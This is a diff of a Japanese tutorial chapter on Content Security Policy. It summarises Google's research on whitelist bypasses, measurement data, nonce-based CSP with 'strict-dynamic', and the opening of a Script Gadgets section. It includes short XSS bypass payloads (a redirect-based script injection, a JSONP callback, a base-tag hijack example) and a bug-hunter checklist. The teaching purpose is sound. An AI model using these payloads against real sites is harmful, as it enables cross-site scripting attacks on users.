+論文はここで重要な指摘をしています。**これらのパターンはそれ自体では直接のセキュリティリスクではないため、開発者に修正の動機がない**。CSPを導入して初めて問題になるのですが、影響を受けるのは自分のオリジンだけでなく、`script-src` に書いたすべてのサードパーティやCDN — つまり**自分が修正を依頼できない相手**にまで及びます。
+
+#### (4) パス制限はセキュリティ機構として機能しない
+
+CSP2はドメイン単位の粒度の粗さを補うためパス指定（`example.org/foo/bar`）を導入しました。しかし、クロスオリジンリダイレクトに関するプライバシー上の懸念（Homakovの "Using Content-Security-Policy for Evil" で議論された、パス情報のクロスオリジン漏洩）への対処として、**リダイレクトの結果として読み込まれたリソースについては、ソース式のパス部分を無視する**という緩和が仕様に入りました。論文Listing 9:
+
+```
+Content-Security-Policy: script-src example.org
+    partially-trusted.org/foo/bar.js
+```
+
+```html
+// Allows loading of untrusted resources via:
+<script src="//example.org?
+    redirect=partially-trusted.org/evil/script.js">
+```
+
+DeepSecスライドのより実戦的な例:
+
+```
+script-src https://whitelisted.com/totally/secure.js https://site.with.redirect.com;
+object-src 'none';
+```
+
+```html
+">'><script src="https://site.with.redirect.com/redirect?url=https%3A//whitelisted.com/jsonp%2Fcallback%3Dalert">
+```
+
+> なぜ動くか: ブラウザはまず `site.with.redirect.com`（ホワイトリスト済み）へリクエストします。そこから `whitelisted.com/jsonp?callback=alert` へ30xリダイレクトされると、リダイレクト後のマッチング処理では**パス成分が無視される**ため、「`/totally/secure.js` だけ許可」という意図は無効化され、同じホストの任意のパス（ここではJSONPエンドポイント）が読み込めてしまいます。仕様の原文は「パス情報のクロスオリジン漏洩を避けるため、リダイレクトの結果ロードされたリソースについてはソース式のパス成分をマッチングアルゴリズムが無視する」と述べています。
+
+OAuthやリファラ漏洩防止など、複雑なアプリにはリダイレクタが普遍的に存在します。したがって論文は「**パス制限はCSPのセキュリティ機構として依拠できない**」と結論します。
+
+> 出典: CSP Is Dead, Long Live Strict CSP! (DeepSec 2016, Lukas Weichselbaum) — https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf
+
+### 大規模実測：数字が語る「CSPは死んでいる」
+
+#### データセットと方法論
+
+- 使用したのはGoogle検索インデックス（約6.5ペタバイト、直近約20日以内にクロールされたレスポンスヘッダとボディ）。
+- インデックスには約**1060億のユニークURL**、**10億のホスト名**、1億7500万のtop private domainが含まれる。
+- そのうち **3,913,578,446 URL（3.7%）** がCSPを持っていた。ただしURL単位では巨大サイトが過大評価されるため、ホスト単位で見ると **1,664,019ホスト（全ホスト名の0.16%）／274,214 top private domain** がCSPを配信していた（論文アブストラクトでは1,680,867ホストと記載）。
+- 100万ホストが5つのEコマースアプリのいずれかにマップされ（例：Alibabaのミニショップは60万超のホストに同一CSPを配信）、ごく少数のポリシーが大量に重複していた。そこで**正規化**（余分な空白除去、nonce/report-uriなど可変値のプレースホルダ化、ディレクティブと値の順序統一・重複排除）した上で重複排除し、最終的に **26,011個のユニークなポリシー** を得た。
+- 同時にバイパス材料も収集: **880万のJSONPエンドポイント**（`callback` / `cb` / `json` / `jsonp` というGETパラメータを持つURLを抽出し、値を変えてリクエストしてレスポンス先頭に反映されるか実検証）と、**260万のAngularJSライブラリ**（ソースコードのシグネチャでマッチし、バージョン文字列も抽出）。ドメイン単位では **194,908ドメインがJSONPエンドポイントを持ち、101,330ドメインがAngularJSをホスト**していました。
+
+判定は自動化された4つのチェック — (1) nonceなしの `'unsafe-inline'`、(2) `object-src` も `default-src` も無い、(3) ホワイトリストに汎用ワイルドカードやURIスキーム（`http:` / `https:` / `data:`）が入っている、(4) ホワイトリストにバイパス可能エンドポイントを持つホストが入っている — で行われました。
+
+#### 用途の実態
+
+ディレクティブの出現頻度（Figure 1）は `script-src` 22,573 / `default-src` 22,294 / `style-src` 20,346 / `img-src` 20,179 …と続き、`frame-ancestors` はわずか2,111（**全体の8.1%**）でした。また26,011ポリシーのうち report-only は **9.96%** にとどまり、**90.04%が強制(enforcing)モード**。これは「CSPは主にXSS対策として使われている」ことの明確な証拠だと論文は述べます。
+
+#### 中核の数字（論文Table 2）
+
+| データセット | 総数 | Report Only | unsafe-inline | object-src欠落 | ワイルドカード | 危険なドメイン | **自明にバイパス可能** |
+|---|---|---|---|---|---|---|---|
+| ユニークCSP | 26,011 | 2,591 (9.96%) | 21,947 (84.38%) | 3,131 (12.04%) | 5,753 (22.12%) | 19,719 (75.81%) | **24,637 (94.72%)** |
+| XSS保護ポリシー | 22,425 | 0 (0%) | 19,652 (87.63%) | 2,109 (9.4%) | 4,816 (21.48%) | 17,754 (79.17%) | **21,232 (94.68%)** |
+| 厳格なXSS保護ポリシー | 2,437 | 0 (0%) | 0 (0%) | 348 (14.28%) | 0 (0%) | 1,015 (41.65%) | **1,244 (51.05%)** |
+
+ここで「XSS保護ポリシー」とは**強制モードで、かつ `script-src` または `default-src` を含むもの**、「厳格なXSS保護ポリシー」とはさらに `'unsafe-inline'`・URIスキーム・汎用 `*` ワイルドカードといった本質的に危険な値を一切含まないものです。
+
+読み取るべきポイントは3つです。
+
+- 全体の94.72%、XSS保護目的に限っても94.68%がバイパス可能。
+- 論文は「**CSPを配信しているホストの99.34%が、XSSに対して何の利益も無いポリシーを使っている**」とも述べています。
+- そして最も重要なのは最終行です。**「危険なキーワードを一切使わず、真面目に作られた」2,437個の厳格なポリシーですら、51.05%が自動ツールだけでバイパスできた**。その大半の原因は `script-src` ホワイトリスト内の危険なオリジンでした。しかもこれは「完全自動で見つかった分」なので**下限値**であり、実際の不安全率はさらに高いと論文は注記しています。
+
+#### ホワイトリストは長くなるほど壊れる
+
+ポリシーあたりのホワイトリストエントリ数は**中央値12**、最長のものは **512ホスト**。そして「**中央値の12エントリの時点で、全ポリシーの94.8%がバイパス可能**」でした（Figure 3）。短いホワイトリストはまだ安全ですが、長くなるほど急速に破綻します。
+
+どのドメインが危険なのか。論文Table 5は、`script-src` に最も多く書かれた15ホストのバイパス可否を示します。
+
+| 件数 | 割合 | ホスト | JSONP | AngularJS | バイパス可否 |
+|---|---|---|---|---|---|
+| 8,825 | 33.93% | www.google-analytics.com | unsafe-evalがあれば可 | 不可 | unsafe-evalがあれば可 |
+| 7,201 | 27.68% | *.googleapis.com | 可 | 可 | **可** |
+| 6,307 | 24.25% | *.google-analytics.com | unsafe-evalがあれば可 | 不可 | unsafe-evalがあれば可 |
+| 5,817 | 22.36% | *.google.com | 可 | 不可 | **可** |
+| 5,475 | 21.05% | *.yandex.ru | 可 | 不可 | **可** |
+| 5,146 | 19.78% | *.gstatic.com | 不可 | 可 | **可** |
+| 5,076 | 19.51% | vk.com | 可 | 不可 | **可** |
+| 4,728 | 18.18% | mc.yandex.ru | 可 | 不可 | **可** |
+| 4,423 | 17.00% | yandex.st | 不可 | 可 | **可** |
+| 4,189 | 16.10% | ajax.googleapis.com | 可 | 可 | **可** |
+| 3,829 | 14.72% | *.googlesyndication.com | 可 | 不可 | **可** |
+| 3,621 | 13.92% | *.doubleclick.net | 可 | 不可 | **可** |
+| 3,617 | 13.91% | yastatic.net | 不可 | 可 | **可** |
+| 2,959 | 11.38% | connect.facebook.net | 不可 | 不可 | 不可 |
+| 2,809 | 10.80% | www.google.com | 可 | 不可 | **可** |
+
+すなわち **15ドメイン中12が完全なCSPバイパスを導入し、2つは `'unsafe-eval'` と組み合わさるとバイパス可能、バイパスが自動発見できなかったのは1つだけ**（`connect.facebook.net`）。そして **上位10ドメインだけで全ユニークCSPの68%をバイパスできる**（Figure 4）。さらに衝撃的な補足として、**仮にこれら上位10ドメインからJSONPとAngularJSを完全に除去したとしても、残るホストで依然として66%のポリシーがバイパス可能**でした。
+
+バイパス手段の内訳（Table 4）は、XSS保護ポリシー22,425件のうち JSONP起因が17,381件、AngularJS起因が12,617件、`object-src` 起因（脆弱なFlashファイル）が2,915件です。
+
+#### script-srcで実際に使われている値（Table 3）
+
+| 値 | 使用率 |
+|---|---|
+| `'self'` | 90.95% |
+| `'unsafe-inline'` | 87.26% |
+| `'unsafe-eval'` | 81.65% |
+| **nonce** | **0.92%** |
+| `https:` | 3.64% |
+| `http:` | 0.85% |
+| `data:` | 4.04% |
+| 汎用ワイルドカード `*` | 1.18% |
+| ワイルドカード付きホスト | 69.59% |
+| パス付きホスト | 6.92% |
+| SHA-256ハッシュ | 1.65% |
+| SHA-384ハッシュ | 0.04% |
+| SHA-512ハッシュ | 0.01% |
+
+**nonceの使用率がわずか0.92%** という数字が、2016年当時の実態を象徴しています。
+
+> 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/
+
+### 解決策：nonceベースCSPと `'strict-dynamic'`
+
+#### なぜnonceなのか
+
+論文の提案はシンプルです。**ドメインを信頼するのをやめ、スクリプト1つ1つを信頼する**。
+
+危険なホワイトリストベースのポリシー:
+
+```
+Content-Security-Policy: script-src example.org
+```
+```html
+<script src="//example.org/script.js?callback=foo"></script>
+```
+
+これは `https://example.org/script?callback=malicious_code` を注入されれば終わりです。これを次のように書き換えます。
 
 ```
 Content-Security-Policy:
-  script-src 'nonce-{RANDOM}' 'strict-dynamic';
-  object-src 'none';
-  base-uri 'none';
+    script-src 'nonce-random123'
+    default-src 'none'
 ```
-
-各ディレクティブの役割と、なぜこの組み合わせが従来のホワイトリストより堅牢なのかを、仕組みレベルで見ていく。
-
-#### `'nonce-{RANDOM}'`：ドメインではなくトークンで許可する
-
-サーバーはページを描画するたびに暗号学的に安全な乱数（nonce、one-time token）を生成し、レスポンスヘッダの`script-src`と、許可したい各`<script>`タグの`nonce`属性の両方に同じ値を埋め込む。
-
 ```html
-<script nonce="r4nd0mBase64Value123">
-  doSomething();
+<script nonce="random123"
+  src="https://example.org/script.js?callback=foo">
 </script>
 ```
 
-ブラウザはスクリプトを実行する前に、そのスクリプトタグの`nonce`属性値がCSPヘッダに書かれたnonce値と**文字列として完全一致するか**だけを確認する。攻撃者がXSSでインラインスクリプトを注入できたとしても、レスポンスヘッダに載っている正しいnonce値をリアルタイムで知る手段がなければ（HTTPレスポンスヘッダはJavaScriptから直接読み取れず、ページごとに値が変わる）、注入したスクリプトにその場でnonceを付与することはできない。これが「ドメインの脇道」を悪用する既存のバイパス手法をすべて無効化する理由である。JSONPエンドポイントや脆弱ライブラリを許可オリジン内に見つけたとしても、そのURLを`<script src="...">`で読み込ませようとする行為自体が、正しいnonceを持たない限りブロックされる。
+> なぜ安全になるか: nonceはリクエストごとに生成される推測不能な値で、CSPヘッダとHTML属性の両方に現れます。マークアップ注入ができる攻撃者は、**その時のnonce値を知らない**ため、同じJSONPエンドポイントを指す `<script>` を注入しても実行されません。ホワイトリストというドメイン単位の粗い信頼が、スクリプトタグ単位の精密な信頼に置き換わります。
 
-#### `'strict-dynamic'`：正規スクリプトが動的に生成する子スクリプトだけを連鎖的に信頼する
+論文はここで運用上の注意点も述べています。**nonceベースポリシーにホワイトリストを足すとnonceの利点が失われます**（リソースはホワイトリストかnonceのどちらかを満たせば通るため）。セキュリティチームが「許可されたホスト」を中央集権的に強制したい場合は、**ブラウザが複数ポリシーをすべて満たすことを要求する性質**を利用して、カンマ区切りで2つのポリシーを配信します。
 
-現代のWebアプリは、`nonce`付きの最初の`<script>`が、さらに別の`<script>`要素をJavaScriptで動的に生成してDOMに挿入する、という構成（バンドラやトラッキングタグ、A/Bテストのローダーなど）を多用する。素朴なnonce方式だと、動的生成されたすべての子スクリプトタグに毎回nonceを付け直す必要があり非現実的になる。
+```
+Content-Security-Policy:
+    <!-- whitelist - based CSP -->
+    script-src https://example.org
+    default-src    https://foobar.org,
+    <!-- nonce - based CSP -->
+    script-src 'nonce-random123'
+```
 
-`'strict-dynamic'`は、「正しいnonce（またはハッシュ）を持つスクリプトが、自分自身の実行中にJavaScriptのDOM API（`document.createElement('script')`など）を使って生成した新しいスクリプトは、そのnonceを持たなくても信頼する」という**伝播（プロパゲーション）ルール**をCSPに追加する。信頼の起点はあくまで「正しいnonceを持つ最初のスクリプト」であり、そこから動的に生成された子だけが連鎖的に信頼される。逆に、攻撃者がXSSで注入したスクリプトは、この信頼の連鎖の外側にあるため、たとえ`document.createElement`を呼んでも新たな信頼は生まれない。
+#### nonceの弱点と `'strict-dynamic'` の発明
 
-`'strict-dynamic'`が指定されている場合、ブラウザはCSP Level 3対応環境において**それ以前に書かれたドメインホワイトリスト部分（例: `https://cdn.example.com`）を無視する**。これは後方互換性のための意図的な仕様で、CSP3非対応の古いブラウザでは従来のホワイトリストにフォールバックしつつ、対応ブラウザではnonceベースの厳格な検証に一本化される（`script-src 'nonce-XXX' 'strict-dynamic' https: http:`のように`https:`等を後方互換用に併記するのが定石）。
+nonceだけでは実務で壊れます。JavaScriptライブラリが**動的にスクリプトを追加する**パターン（極めて一般的）で、ライブラリはnonce値を知らないからです。
 
-#### `object-src 'none'`：プラグイン経由の実行経路を封じる
+```html
+<script nonce="r4nd0m">
+  var s = document.createElement("script");
+  s.src = "//example.com/bar.js";
+  document.body.appendChild(s);
+</script>
+```
 
-`<object>`、`<embed>`、`<applet>`タグはFlashなど旧来のプラグインを読み込むためのもので、こうしたプラグイン内で実行されるコンテンツはCSPの`script-src`の管理下に入らず、独自にJavaScriptに似たコードを実行できる場合があった（例: 古いFlashの`ExternalInterface`経由でのJS実行）。`object-src 'none'`は、この「CSPの監視が及ばない実行経路」自体を完全に塞ぐ。nonce/strict-dynamicでスクリプトタグ経路をどれだけ堅牢にしても、プラグイン経由の抜け道を残せば無意味になるため、strict CSPでは必須のディレクティブとされる。
+このとき `bar.js` はnonceを持たないためブロックされます。ライブラリを改造して2段目以降のスクリプトにnonceを伝播させるのは現実的ではありません。
 
-#### `base-uri 'none'`：`<base>`タグによる相対パス書き換え攻撃を封じる
+そこで論文が提案し、CSP3ドラフトに入ったのが **`'strict-dynamic'`** です。`script-src` にnonce（またはhash）と共に書かれると、次の2つの効果が生じます。
 
-HTMLの`<base href="...">`タグは、ページ内のすべての相対URL（`<script src="app.js">`のようなパス）の基準となるオリジンを書き換える。もし攻撃者がHTMLインジェクションで`<base href="https://attacker.example/">`を注入できれば、正規のページが`<script src="app.js">`のように相対パスでスクリプトを読み込んでいる箇所を、攻撃者のサーバーから配信される悪意あるコードにすり替えることができる。これはスクリプトタグ自体を新規に注入する必要がなく、既存の正規スクリプトタグの「読み込み先」を差し替えるだけなので、nonce検証を回避しうる。`base-uri 'none'`（または`base-uri 'self'`）はこの`<base>`タグの機能自体を無効化・制限し、相対パス書き換えによる読み込み先ハイジャックを防ぐ。
+- **動的に追加されたスクリプトの実行を許可する**。具体的には `document.createElement('script')` で作られたスクリプトノードは、その読み込み元URLがホワイトリストにあるかどうかに関係なく許可される。
+- **他の `script-src` ホワイトリストエントリを無視する**。静的な（パーサが挿入した）スクリプトは、正しいnonceを伴わない限り実行されない。
 
-### strict CSPの効果と限界
+```
+Content-Security-Policy:
+  script-src 'nonce-random123' 'strict-dynamic';
+  object-src 'none';
+```
 
-DeepSec 2016のスライド版（"CSP Is Dead, Long Live Strict CSP!"）では、この設計をGoogle社内の主要プロダクト（例: Gmail等）に段階的に導入した経緯と、nonceベースCSPが従来のドメインホワイトリスト方式に比べて実際に高いXSS防御力を示したことが報告されている。ポイントは、CSPの信頼モデルを「どこから来たか（Where）」から「誰が生成したか（Who／実行系譜）」へ転換したことにあり、これによりオリジン単位の脇道探索という攻撃面をほぼ排除できる。
+> なぜ安全なままなのか: この設計の核心にある観察は「**`createElement()` で追加されるスクリプトは、すでにアプリケーションが信頼しているものである**」という点です。開発者が明示的にロードを選んだコードだからです。一方、マークアップ注入のバグを見つけた攻撃者は、**まずJavaScriptを実行できなければ `createElement()` を呼べません**。そしてJavaScriptを実行するには正しいnonceが必要です。つまり信頼は「nonceを持つ起点スクリプト」から「その子孫スクリプト」へ**推移的にのみ**伝播し、注入されたマークアップからは伝播しません。
 
-ただし、strict CSPも万能ではない。以下のような限界が残る。
+DeepSecスライドは伝播の境界を明確に示しています。`'strict-dynamic'` が信頼を伝播させるのは **non-parser-inserted（パーサ非挿入）** なスクリプトだけです。したがって以下はいずれも**動きません**。
 
-- **DOM-based XSSでnonceを盗めるケース**：ページ内に既存の脆弱性（例: nonce値をDOMやJavaScript変数として露出させてしまう実装ミス、あるいはXSSではなく別の情報漏洩経路）があれば、攻撃者がnonce値そのものを取得して正規のnonce付きスクリプトタグを偽装できる可能性がある。nonceはHTTPレスポンスヘッダとHTML内にしか本来存在しないが、テンプレートエンジンの実装次第では`window.__nonce__ = "..."`のようにJS変数へ複製してしまう実装ミスが起こりうる。
-- **`'unsafe-inline'`との共存不可**：strict CSPを機能させるには`'unsafe-inline'`を完全に廃止し、すべてのインラインスクリプト・イベントハンドラ属性（`onclick="..."`等）をnonce付き外部スクリプトまたは別の許可手段（ハッシュベース許可）に置き換える必要があり、レガシーなコードベースでは移行コストが高い。
-- **信頼された型（Trusted Types）との併用が推奨**：nonceベースCSPはスクリプトの「読み込み」を制御するが、`innerHTML`等のsinkへのDOM-based XSSそのものを防ぐわけではないため、後続の防御層としてTrusted Types等の併用が推奨される（本教科書の別セクションで扱う）。
-- **レポート専用モード（`Content-Security-Policy-Report-Only`）からの段階移行が前提**：既存の大規模サイトがいきなり強制ブロックモードに切り替えると正規機能を壊すリスクが高いため、まず違反レポートのみを収集するモードで実運用データを集め、誤検知を潰してから本番適用する運用が推奨される。
+```html
+<script nonce="r4nd0m">
+  var s = "<script ";
+  s += "src=//example.com/bar.js></script>";
+  document.write(s);
+</script>
+```
+```html
+<script nonce="r4nd0m">
+  var s = "<script ";
+  s += "src=//example.com/bar.js></script>";
+  document.body.innerHTML = s;
+</script>
+```
 
-> ⚠️ **未取得の資料**: 「CSP Is Dead, Long Live Strict CSP! （Lukas Weichselbaum, DeepSec 2016 スライド）」は自動取得できませんでした（理由: 実行環境のegressプロキシにより deepsec.net ドメインへのアクセスがブロックされているため。GitHub上の代替ミラーも確認できませんでした）。以下のURLからユーザーご自身で直接ご覧ください: https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf
->
-> （以下は未取得資料の補足として、Web検索で得られた公開情報および一般知識に基づく解説です）本スライドは同名論文の著者Lukas WeichselbaumがDeepSec 2016カンファレンスで行った発表資料であり、論文の学術的な統計結果（94.72%バイパス可能）を踏まえて、実運用者向けに「strict CSP」導入の具体的な手順・ポリシー例・移行のベストプラクティスを提示する内容とされる。公開されているGoogleの啓発サイト（Content Security Policyの実践ガイド）でも同様の推奨ポリシーが示されており、代表例は次の形である。
->
-> ```
-> Content-Security-Policy:
->   object-src 'none';
->   script-src 'nonce-{random}' 'strict-dynamic' https: http: 'unsafe-inline';
->   base-uri 'none';
->   report-uri https://your-report-collector.example.com/
-> ```
->
-> ここで末尾に付く`https: http: 'unsafe-inline'`は、CSP Level 3（`'strict-dynamic'`とnonceを理解する対応ブラウザ）では無視される「意図的なフォールバック」であり、CSP3非対応の古いブラウザ向けに最低限のホワイトリスト＋`'unsafe-inline'`相当の緩い保護を残すためのものである。CSP3対応ブラウザは仕様上、`'strict-dynamic'`が存在する場合はホワイトリストと`'unsafe-inline'`を無視してnonce検証のみを行うため、新旧両対応のポリシーとして機能する。`report-uri`（および後継の`report-to`）は違反が起きた際にブラウザから自動的にJSON形式のレポートを指定エンドポイントへ送信させる仕組みで、本番投入前の検証や、投入後の攻撃観測・回帰検知に用いられる。
+> なぜ動かないか: `document.write()` や `innerHTML` 経由で挿入されたスクリプトは、HTMLパーサによって生成されるため「parser-inserted」扱いになります（そもそも `innerHTML` 経由の `<script>` はHTML仕様上実行されません）。信頼の伝播はDOM APIで明示的に作られたスクリプトノードに限定されており、これが「文字列からHTMLを組み立てる」という**XSSと区別がつかないパターン**を巻き込まないための線引きです。
 
-### まとめ：CSPを学ぶ上での要点
+#### 古いブラウザへのフォールバックを含む実戦的なポリシー
 
-1. **ドメインホワイトリスト方式のCSPは、許可したドメインの中に「攻撃者が制御できる実行経路」（JSONP、アップロード機能、脆弱な古いライブラリ）が1つでもあれば実質的に無力化される**。これはCSPがオリジン単位でしか検証を行わないという設計上の制約に起因する、構造的な弱点である。
-2. **nonceベースの`strict-dynamic`方式は、「どこから読み込むか」ではなく「誰（どの信頼された実行系譜）が生成したか」で許可を判定する**ことで、ドメイン単位の脇道探索という攻撃面そのものを消し去る。
-3. `object-src 'none'`と`base-uri 'none'`は、スクリプトタグ以外の実行経路・書き換え経路を塞ぐための必須の補助ディレクティブである。
-4. CSPは「多層防御の一層」であり、単体でXSSを根絶する銀の弾丸ではない。sink側の対策（安全なDOM API利用、Trusted Types等）と組み合わせて初めて実効性を持つ、という認識が本章全体を貫く前提となる。
+DeepSecスライドが推奨する「そのままコピーして使える」形はこれです。
+
+```
+script-src 'nonce-r4nd0m' 'strict-dynamic' 'unsafe-inline' https:;
+object-src 'none';
+```
+
+各トークンの役割と、ブラウザ世代ごとの解釈:
+
+| トークン | 意味 |
+|---|---|
+| `'nonce-r4nd0m'` | 正しいnonceを持つスクリプトを実行許可 |
+| `'strict-dynamic'` | **[新]** 信頼を伝播し、ホワイトリストを破棄する |
+| `'unsafe-inline'` | CSP2以降ではnonceの存在により無視される。**CSP1しか解さない古いブラウザで `script-src` を無害化(no-op)するため**に置く |
+| `https:` | HTTPSスクリプトを許可。`'strict-dynamic'` をサポートするブラウザでは破棄される |
+
+- **CSP3対応ブラウザ**: `'strict-dynamic'` が効き、`'unsafe-inline'` と `https:` は破棄される → 最も強い保護。
+- **CSP2対応ブラウザ**（nonceは理解するが `'strict-dynamic'` は知らない）: nonceの存在により `'unsafe-inline'` が破棄され、`https:` によるホワイトリストベースの保護が働く。
+- **CSP1しか対応しないブラウザ**: nonceを理解しないため `'unsafe-inline'` が有効になり、ポリシーは実質no-op（=既存サイトを壊さない）。
+
+この「**段階的に劣化するが決してサイトを壊さない**」設計が、strict CSPの採用しやすさを支えています。
+
+#### 限界（論文4.3節 + スライド）
+
+`'strict-dynamic'` は万能薬ではありません。
+
+**セキュリティ上の限界:**
+
+```html
+<script nonce="r4nd0m">
+  var s = document.createElement("script");
+  s.src = userInput + "/x.js";
+</script>
+```
+
+> なぜ問題か: XSSの根本原因が「動的に作られたスクリプトの `src` 属性に信頼できないデータが流れ込む」ことである場合、ホワイトリストベースのCSPなら読み込み先がポリシーで制限されていたのに対し、`'strict-dynamic'` では制限が外れるため**むしろ悪用可能になります**。
+
+他の限界として、(a) nonceを付けた `<script>` の**内部**に注入点がある場合は無条件に実行されてしまう（ただしこれは従来のポリシーでも同じ）、(b) スクリプト実行を防げても post-XSS / scriptless attacks のような限定的だが有害な攻撃は残りうる、が挙げられています。
+
+**互換性上の限界:**
+
+- `document.write()` で動的にスクリプトを追加しているコードは `'strict-dynamic'` でブロックされるため、`createElement()` に書き換えるか、`document.write` で生成する `<script>` に明示的にnonceを渡す必要がある。
+- `'strict-dynamic'` は、`javascript:` URIやインラインイベントハンドラといった**CSP非互換マークアップを除去する作業を不要にはしない**。
+
+ただし、スライドが強調するように「**新たに生まれる攻撃面（動的スクリプトロードDOM API）は、レビューとコントロールが格段に容易**」です。ホワイトリスト上の全ドメインの全エンドポイントを監査するのと、自分のコード内の `createElement('script').src` を数えるのとでは、難易度が桁違いです。
+
+#### 実運用の実績（ケーススタディ）
+
+論文は Google Maps Activities（月間アクティブユーザ400万の複雑なJavaScript重量級アプリ）での経験を報告しています。
+
+- 2015年2月にホワイトリストベースの強制CSPを導入。単純なポリシーから始めたが、アプリ・API・ライブラリの変化に追従するため **2015年を通じて5回の大きな変更** を余儀なくされた。
+- 本番での破損を避けるためオリジンを定期更新した結果、`script-src` ホワイトリストは **15個の長いパス** にまで膨れ上がり、しかも**最低1つのJSONPエンドポイントを含まざるを得なかった** — つまりXSS対策としては無効だった。
+- 一方、マークアップへのnonce付与はすでに済んでいたため、**ホワイトリストベースから `'strict-dynamic'` を使うnonceのみのポリシーへの移行はリファクタリング不要**だった。移行後はポリシーが劇的に単純化され、破損も減り、**それ以降ポリシーを変更する必要が一度も無かった**。
+- 同様のポリシーが Google Photos、Cloud Console、History、Cultural Institute などにも展開された。DeepSecスライドの時点で **月間アクティブユーザ合計3億以上** のGoogleサービスに展開済みで、Google Maps API、Google Charts API、Facebookウィジェット、Twitterウィジェット、reCAPTCHAなどが**追加作業なしで動作する**と報告されています。
+
+論文は、Google社内のXSSバグ数百件の根本原因分析に基づき、「**大多数のXSSはnonceベースポリシーで緩和できる**」と結論しています。
+
+#### 診断ツール：CSP Evaluator
+
+著者らは、実際のポリシーをこれらの基準で自動評価するツール **CSP Evaluator**（https://csp-evaluator.withgoogle.com ）を公開しています。コアライブラリはオープンソースで、Chrome拡張としても提供されています。自分のサイトのCSPが「94.72%側」に入っていないかを確認する最初の一歩として有用です。
+
+> 出典: CSP Is Dead, Long Live Strict CSP! (DeepSec 2016, Lukas Weichselbaum) — https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf
+
+### まとめ：バグハンター視点での読み替え
+
+この論文の結論は、防御側にとっては「ホワイトリストを捨ててnonce + `'strict-dynamic'` へ移行せよ」というメッセージですが、攻撃側・診断側の視点で読み替えると、XSSを見つけた後に「CSPがあるから報告価値が下がる」と諦める前に確認すべきチェックリストになります。
+
+1. **`object-src` / `default-src` はあるか。** 無ければ `<object>` + 既知の脆弱なSWFでスクリプト実行に到達しうる（2016年時点の手法。現在はFlashが廃止されているため、この経路は歴史的知識として理解する）。
+2. **`'unsafe-inline'` がnonce無しで入っていないか。** 入っていればCSPは実質存在しない。
+3. **`data:` やスキーム、汎用ワイルドカードは無いか。**
+4. **ホワイトリストの各ホストにJSONPエンドポイントは無いか。** `callback` / `cb` / `json` / `jsonp` パラメータを試す。
+5. **ホワイトリストの各ホストにAngularJS（特にサンドボックスバイパスが既知の旧版）や、`Function.prototype` を拡張する旧Prototype.jsは置かれていないか。**
+6. **ホワイトリストにオープンリダイレクタは無いか。** あればパス制限は無効化できる。
+7. **`'self'` が許可されていて、かつ同一オリジンに任意ファイルをアップロードできないか。**
+8. **`'strict-dynamic'` がある場合は**、ホワイトリスト由来のバイパスは全て無効になるので、代わりに「動的スクリプト生成の `src` に自分の入力が届くか」「nonce付きスクリプトの内部に注入できるか」「nonceが予測可能／漏洩していないか」を探す。
+
+そして最後に、論文自身が強調している原則を忘れないでください。**CSPは多層防御であり、入力検証と出力エンコーディングの代替ではありません。** CSPがあるかどうかにかかわらず、XSSの根本原因を潰すことが第一の防御です。
+
+> 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/
+> 出典: CSP Is Dead, Long Live Strict CSP! (DeepSec 2016, Lukas Weichselbaum) — https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf
 
 ---
 
 ## Script Gadgets（CSP Evaluator / Black Hat論文）
 
-これまでの章では、CSP（Content Security Policy）を「攻撃者が任意のスクリプトを注入しても実行させない仕組み」として学んできた。しかし現実のWebアプリケーションには、jQueryやAngularJS、Bootstrap、あるいは自社のフロントエンドコードなど、大量の**信頼された（allowlistに載っている、あるいはページに元から存在する）JavaScriptライブラリ**が動いている。
+これまでの章では、CSP（Content Security Policy）を「攻撃者が任意のスクリプトを注入しても実行させない仕組み」として学んできた。しかし現実のWebアプリケーションには、jQuery や AngularJS、Bootstrap、Vue、あるいは自社のフロントエンドコードなど、大量の**信頼された（allowlistに載っている、あるいはページに元から存在する）JavaScriptライブラリ**が動いている。
 
-**Script Gadgets（スクリプトガジェット）** とは、こうした「正規の、悪意のないJavaScriptコード」でありながら、**攻撃者が制御できるDOM要素（属性・クラス名・data属性など）を読み取り、その内容に基づいてスクリプトを実行してしまう副作用を持つコード片**のことを指す。攻撃者は、CSPやサニタイザ、WAF（Web Application Firewall）を通過できる「無害に見えるHTMLタグ・属性」だけを注入し、ページ上に既に存在するgadget（正規コード）に「解釈」させることで、間接的にスクリプトを実行させる。つまり、**攻撃者は`<script>`を注入する必要がない**。ページ側のライブラリが、注入されたマークアップを見て「これはUIコンポーネントの初期化指示だ」と誤解し、自らJavaScriptを実行してしまうのである。
+**Script Gadgets（スクリプトガジェット）** とは、ページ上に**既に存在する正規のJavaScriptコード**でありながら、**攻撃者が制御できるDOM要素（タグ・属性・クラス名・`data-*`属性など）を読み取り、その内容に基づいてスクリプトを実行してしまう副作用を持つコード片**のことを指す。攻撃者は、CSPやサニタイザ、XSSフィルタ、WAF（Web Application Firewall）を通過できる「無害に見えるHTMLタグ・属性」だけを注入し、ページ上に既に存在するgadget（正規コード）にそれを「解釈」させることで、間接的にスクリプトを実行させる。つまり、**攻撃者は`<script>`を注入する必要がない**。ページ側のライブラリが、注入されたマークアップを見て「これはUIコンポーネントの初期化指示だ」と誤解し、自らJavaScriptを実行してしまうのである。
 
-この章では、この技法を体系化した研究（Black Hat USA 2017発表)と、CSPポリシーの脆弱性を機械的に検出するGoogleのツール「CSP Evaluator」を扱う。両者は表裏一体の関係にある。CSP Evaluatorは「このホストを許可すると、そこにScript Gadgetsが存在するかもしれない」という観点でポリシーを評価するツールであり、Script Gadgets研究はその脅威モデルの土台を作った論文だからである。
+原典の言葉を借りれば、Script Gadgetの定義はこうだ。
+
+> Script Gadget is an *existing* JS code on the page that may be used to bypass mitigations.
+> （Script Gadgetとは、緩和策をバイパスするために利用しうる、ページ上に*既に存在する*JSコードである。）
+>
